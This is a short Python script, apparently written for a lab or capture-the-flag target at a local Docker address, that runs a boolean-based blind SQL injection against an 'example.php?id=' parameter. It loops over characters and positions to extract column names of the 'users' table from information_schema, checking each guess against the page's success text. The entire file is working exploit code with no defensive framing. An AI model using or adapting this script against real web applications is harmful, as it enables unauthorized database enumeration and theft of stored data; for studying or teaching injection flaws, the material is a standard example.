#!/usr/bin/python3
from pwn import log
import string, requests

characters = string.ascii_lowercase
bar = log.progress("Columns")

value = ""

for column in range(0,5):
    value += "\n\033[1;37m[\033[1;34m*\033[1;37m] "
    for position in range(0,10):
        for character in characters:
            request = requests.get(f"http://172.17.0.2/example.php?id=1'and (select substr(column_name,{position},1) from information_schema.columns where table_schema='example' and table_name='users' limit {column},1)='{character}'-- -")
            if request.text == "Query was successfully":
                value += character
                bar.status(value)
